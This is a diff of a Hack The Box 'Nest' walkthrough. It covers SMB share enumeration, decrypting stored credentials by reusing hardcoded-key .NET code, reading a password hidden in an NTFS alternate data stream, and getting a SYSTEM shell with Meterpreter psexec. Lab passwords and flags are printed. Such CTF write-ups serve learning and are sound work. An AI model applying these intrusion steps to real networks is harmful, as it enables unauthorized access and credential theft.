@@ -1,10 +1,14 @@
 # HTB - Nest
 
+## Enumeration
+
+### Nmap scan
+
 Like always, I started my enumeration with an nmap scan of `10.10.10.177`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally. The scan only showed one port open during my initial scan so I ran it again to verify, and it came back with the same results.
 
-```text
+```bash
 zweilos@kalimaa:~/htb/nest$ nmap -p- -A -oA nest.full 10.10.10.178 -Pn
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:47 EDT
@@ -106,6 +110,8 @@ smb: \> ls
                 10485247 blocks of size 4096. 6543375 blocks available
 ```
 
+### Further enumeration
+
 Hmm...a list of users with accounts on this machine?
 
 I was now able to access the user folder for `TempUser`. However, it only contained a blank text file. I wasn't able to access anything in the other user's folders.
@@ -120,7 +126,7 @@ smb: \tempuser\> ls
                 10485247 blocks of size 4096. 6545793 blocks available
 ```
 
-Since that appeared to be a dead-end, I tried going back and logging into the other network shares. `TempUser` was able to access some folders in the `Data` share that I wasn't able to get to before. After searching around for awhile, I came across a couple files with interesting information. In the `\IT\Configs\NotepadPlusPlus\` folder there was a `config.xml` file.
+Since that appeared to be a dead-end, I went back and logged into the other network shares. `TempUser` was able to access some folders in the `Data` share that I wasn't able to get to before. After searching around for awhile, I came across a couple files with interesting information. In the `\IT\Configs\NotepadPlusPlus\` folder there were a couple of .xml files.
 
 ```text
 smb: \IT\Configs\NotepadPlusPlus\> ls
@@ -162,7 +168,9 @@ The `shortcuts.xml` file did not have anything useful in it, but `config.xml` di
 </NotepadPlus>
 ```
 
-This config file contained a history of the text searches and files that had been opened with Notepad++ \(My favorite Windows text editor as well, by the way\). One item in particular stood out: `\\HTB-NEST\Secure$\IT\Carl\Temp.txt`. I decided to keep looking around and come back to that later since I couldn't access anything in the the `\Secure$\IT\` folder as this user.
+This config file contained a history of the text searches and files that had been opened with [Notepad++](https://notepad-plus-plus.org/) \(My favorite Windows text editor as well, by the way\). One item in particular stood out: `\\HTB-NEST\Secure$\IT\Carl\Temp.txt`. I decided to keep looking around and come back to that later since I couldn't access anything in the the `\Secure$\IT\` folder as this user.
+
+### Finding user creds
 
 After searching around a bit more, I found an XML file in `\IT\Configs\RU Scanner\` folder that had something interesting.
 
@@ -193,7 +201,11 @@ zweilos@kalimaa:~/htb/nest$ echo "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=" 
 }13��=X�J�BA�X*�Wc�f���?βc
 ```
 
-This did not look to be simply base64 encoded. After trying to decode/decrypt the password for a while, I gave up and decided to keep looking. That NotepadPlusPlus config file from earlier showed a file being opened on the `/Secure$/IT` share so I decided to see if I could access the file directly, since I wasnt't able to list files in that directory when I tried earlier.
+This did not look to be simply base64 encoded. After trying to decode/decrypt the password for a while, I gave up and decided to keep looking. 
+
+### Decrypting the user creds
+
+That Notepad++ config file from earlier showed a file being opened on the `/Secure$/IT` share so I decided to see if I could access the file directly, since I wasn't able to list files in that directory when I tried earlier.
 
 ```text
 smb: \> get \IT\Carl\Temp.txt
@@ -232,11 +244,16 @@ smb: \IT\Carl\VB Projects\WIP\RU\> ls
 
 I copied the whole `VB Projects` folder to my computer and opened the solution file in Visual Studio Code.
 
+#### Copying an entire SMB folder recursively using smbclient:
+
 > \*Side note: In order to copy a whole folder in SMB you need to do a little set up. From [https://indradjy.wordpress.com/2010/04/14/getting-whole-folder-using-smbclient/](https://indradjy.wordpress.com/2010/04/14/getting-whole-folder-using-smbclient/):
 >
-> Connect using: `smbclient -U <user> \\\\<ip>\\<folder> <password>`  
-> smb: `tarmode` smb: `recurse` smb: `prompt` smb: `mget <folder_to_copy>\`
->
+> * [ ] Connect using: `smbclient -U <user> \\\\<ip>\\<folder> <password>`
+> * [ ] smb: `tarmode` 
+> * [ ] smb: `recurse` 
+> * [ ] smb: `prompt` 
+> * [ ] smb: `mget <folder_to_copy>\`
+
 > `mget` will now allow the whole folder and subfolders to be copied recursively to your local `pwd` \(wherever you were before you logged into smbclient\).
 
 ![](.gitbook/assets/screenshot_2020-06-13_13-05-14.png)
@@ -321,7 +338,9 @@ Public Shared Function Decrypt(ByVal cipherText As String, _
     End Function
 ```
 
-To quickly run any kind of .NET code on the go without having to install Visual Studio and the proper dependencies, I highly recommend the website [`https://dotnetfiddle.net/`](https://dotnetfiddle.net/).
+To quickly compile and run any kind of .NET code on the go without having to install Visual Studio and the proper dependencies, I highly recommend the website [`https://dotnetfiddle.net/`](https://dotnetfiddle.net/).
+
+{% embed url="https://dotnetfiddle.net/" caption="Great for any .NET language, not just C\#" %}
 
 I selected `VB.NET` as my language, then copied over the relevant code into the site, and with a little bit of tweaking was able to hit the `> Run` button up top to get the output of my code. You can see below how I modified the `Main()` function to print the decrypted password to the console using the hardcoded values from `Utils.DecryptString()`.
 
@@ -336,7 +355,7 @@ Public Function Main()
 
 As you can see, my shortened program worked and gave me the password for `c.smith`, which is `xRxRxPANCAK3SxRxRx`!
 
-## Path to Power \(Gaining Administrator Access\)
+### User.txt
 
 Now that I had credentials as another user, time to see if I could find that `user.txt`. It was in the `Users` share, right in the `c.smith` folder.
 
@@ -358,6 +377,12 @@ zweilos@kalimaa:~/htb/nest$ cat 'c.smith\user.txt'
 81960e14de90f242c05d946fc1f94cbe
 ```
 
+## Path to Power \(Gaining Administrator Access\)
+
+### Enumeration as User
+
+User milestone complete, now it was time to work on escalating privileges.  I continued searching through the available `\HQK Reporting\` directory, where I found a few very interesting files. 
+
 ```text
 smb: \c.smith\> cd "HQK Reporting"
 smb: \c.smith\HQK Reporting\> ls
@@ -377,21 +402,11 @@ smb: \c.smith\HQK Reporting\AD Integration Module\> ls
                 10485247 blocks of size 4096. 6545807 blocks available
 ```
 
-```text
-...found this xml file...
-```
+The `"Debug Mode Password.txt"` appeared to be empty, but from my past experiences with doing CTFs in Windows environments I have learned that if a filename says it has a password or flag in it, it probably does. You might just have to try a little harder to get it. In this case, the user tried to hide the password from common snooping by inserting it into an NTFS alternate data stream \(ADS\). You can read more about ADS and how to detect them at [https://www.sans.org/blog/alternate-data-streams-overview/](https://www.sans.org/blog/alternate-data-streams-overview/). 
 
-```markup
-zweilos@kalimaa:~/htb/nest$ cat HQK\ Reporting\\HQK_Config_Backup.xml
+#### Detecting and reading Alternate Data Streams \(ADS\) over SMB
 
-<?xml version="1.0"?>
-<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
-  <Port>4386</Port>
-  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
-</ServiceSettings>
-```
-
-The `"Debug Mode Password.txt"` appeared to be empty, but from my past experiences with doing CTFs in Windows environments I have learned that if a filename says it has a password or flag in it, it probably does. You might just have to try a little harder to get it. In this case, the user tried to hide the password from common snooping by inserting it into an NTFS alternate data stream \(ADS\). You can read more about ADS and how to detect them at [https://www.sans.org/blog/alternate-data-streams-overview/](https://www.sans.org/blog/alternate-data-streams-overview/). In order to locate any alternate data streams in this file over SMB, you need to use the `allinfo` command, then `Get` the file with the appropriate stream name appended to it. You can read more about this at [https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux](https://www.sans.org/blog/alternate-data-streams-overview/).
+In order to locate any alternate data streams in this file over SMB, you need to use the `allinfo` command, then `Get` the file with the appropriate stream name appended to it. You can read more about this at [https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux](https://www.sans.org/blog/alternate-data-streams-overview/).
 
 ```text
 smb: \C.Smith\HQK Reporting\> allinfo
@@ -412,14 +427,21 @@ zweilos@kalimaa:~/htb/nest$ cat 'Debug Mode Password.txt:Password:$DATA'
 WBQ201953D8w
 ```
 
-```text
-...more about ADS and getting the password...
+Well now I had a password to something called `Debug Mode` but I had no idea where to use it.  Next I opened the `HQK_Config_Backup.xml` file.  
 
+```markup
+zweilos@kalimaa:~/htb/nest$ cat HQK\ Reporting\\HQK_Config_Backup.xml
 
-...more about telnet-ing into the box...
+<?xml version="1.0"?>
+<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>4386</Port>
+  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>
 ```
 
-`HQK_Config_Backup.xml` mentioned port 4386, three things to do with unknown ports...nc, telnet, and ssh. `nc` simply reported back the banner `HQK Reporting Service V1.2` and nothing else. `Telnet` however gave me an interactive prompt.
+### Dealing with unknown ports
+
+`HQK_Config_Backup.xml` mentioned port 4386, which I didn't recognize.  A quick internet search revealed nothing about this port other than it was in an unassigned block.  There are generally three things to try when dealing with unknown ports...netcat, telnet, and ssh.  In this case, `nc` simply reported back the banner `HQK Reporting Service V1.2` and nothing else. `Telnet` however gave me an interactive prompt.
 
 ```text
 zweilos@kalimaa:~/htb/nest$ telnet 10.10.10.178 4386
@@ -460,9 +482,7 @@ Current Directory: ALL QUERIES
 Invalid database configuration found. Please contact your system administrator
 ```
 
-```text
-...talk about how runquery and invalid database... next tried that debug command and the password I found...
-```
+The HQK Reporting Service gave access to a very simplistic shell with a limited set of commands.  It was designed to allow a user to run queries on invoices and products sold, but the database did not seem to be connected to the program.  After spending time trying to find any useful information, I realized that this was not going to give anything other than the same "Invalid database configuration found." error.  Time to see if that `Debug Mode` password I found earlier worked here.
 
 ```text
 >debug WBQ201953D8w
@@ -504,6 +524,11 @@ Server Endpoint: 10.10.10.178:4386
 Client Endpoint: 10.10.14.253:51630
 Current Query Directory: C:\Program Files\HQK\ALL QUERIES
 
+```
+
+The password worked, and I now had a couple of additional commands available.  The `service` and `session` commands gave a little bit of additional information about the server program, but it didn't seem to be useful at this point.  I continued to look around.
+
+```text
 >setdir ..
 
 Current directory set to HQK
@@ -555,9 +580,11 @@ User=Administrator
 Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
 ```
 
-```text
-...now have admin password, but decrypt method from VB didn't work.  below error.
-```
+The `showquery` command was a bit more useful than the `runquery` command earlier.  It was able to read and display the contents of text files.  After searching around for a bit, I found the file `ldap.conf` which contained the Administrator password!  Unfortunately, like the user password it was encrypted.
+
+### Decrypting the Administrator password
+
+The first thing I tried after finding the encrypted password was to use the `decrypt()` function I had made from the Visual Basic project earlier.  Unfortunately, this password seemed to be in a different format, as I got the error `Padding is invalid and cannot be removed.` Either I was missing some input values, or this was not the correct program to decrypt this password. 
 
 ![](.gitbook/assets/screenshot_2020-06-14_04-38-04.png)
 
@@ -574,20 +601,19 @@ Stack Trace:
    at Utils.Main()
 ```
 
-```text
-...padding is invalid...seems like this password is in the wrong format for this decrypt algorithm.  Maybe that HqkLdap.exe I found in the `\c.smith\HQK Reporting\` earlier would prove to be more useful?...
+I searched through all of my notes for any potential values to substitute into the function, but nothing worked.  I decided to test out the file `HqkLdap.exe` I had found in the `\c.smith\HQK Reporting\` folder earlier in the hopes that it would be of use.  
 
+### Disassembling the .NET executable
 
-...more about finding the executable file earlier and working to decrypt admin password...
-```
+I used `ILSpy` to disassemble the executable file into readable .NET code \(in this case ILSpy told me the language was C\#\). This amazingly useful program can be found at [https://github.com/icsharpcode/AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy).
 
-I used `ILSpy` to dissassemble the executable file into readable .NET code \(in this case ILSpy told me the language was C\#\). This amazingly useful program can be found at [https://github.com/icsharpcode/AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy).
+{% embed url="https://github.com/icsharpcode/AvaloniaILSpy" %}
 
-I found the relevant decryption methods under the `HqkLdap.CR` namespace. This program was actually structured quite similarly to the VB project `RU Scanner` from before, so it didn't take much effort to find the code I needed, even with the method names stripped and replaced with two letters.
+I found the relevant decryption methods under the `HqkLdap.CR` namespace. This program was actually structured quite similarly to the VB project `RU Scanner` from before, so it didn't take much effort to find the code I needed, even with the method names stripped and replaced with simple two-letter names.
 
 ![](.gitbook/assets/screenshot_2020-06-13_14-40-12.png)
 
-...fixing the C\# code...
+Like before, I cut out only the function that I needed to decrypt the password.  I wrote a simple `Main()` function that would write the decrypted password to the console.  Like the `Decrypt()` function from before, this one had hardcoded initialization vector and salt values included in the source code.  This is bad practice in real-world situations and should be avoided. 
 
 ```text
 // HqkLdap.CR
@@ -641,20 +667,24 @@ public class CR
 }
 ```
 
-```text
-...and then running it...
-```
+After cleaning up the code a bit, I once again copied it over to .NET Fiddle, this time selecting C\# as the language.  
 
 ![](.gitbook/assets/user_administrator_c-_decrypt.png)
 
-RU Scanner --&gt; XtH4nkS4Pl4y1nGX
+After clicking `> Run` the function provided me with the Administrator password `XtH4nkS4Pl4y1nGX`
+
+### Root.txt
+
+Once I had the Administrator password, it was simple to find the root flag.  It was in the `Administrator\Desktop\` folder in the `Users` share.
 
 ```text
 zweilos@kalimaa:~/htb/nest$ cat 'Administrator\Desktop\root.txt' 
 2f1fbb443419c664fff8b0f0424a3da1
 ```
 
-I also went back to see if I could actually get a shell on the box to try to elevate to System privileges since this entire box had been completed in locked down quasi-shells the whole time...
+### Getting a shell
+
+After getting the root flag, I also went back to see if I could actually get a shell on the box to try to elevate to System privileges since this entire box had been completed in locked down quasi-shells the whole time.  I used the `psexec` module through Meterpreter with the Administrator credentials, and it returned a System shell right away.
 
 ```text
 meterpreter > shell
@@ -670,5 +700,7 @@ nt authority\system
 C:\Windows\system32>
 ```
 
-Thanks to [`Vbscrub`](https://www.hackthebox.eu/home/users/profile/158833) for creating such a unique and interesting challenge. I certainly learned a few useful new tricks.
+Thanks to [`Vbscrub`](https://www.hackthebox.eu/home/users/profile/158833) for creating such a unique and interesting challenge! I certainly learned a few useful new tricks, and learned to always check back in places where you may have already been upon gaining new levels of access.
+
+If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
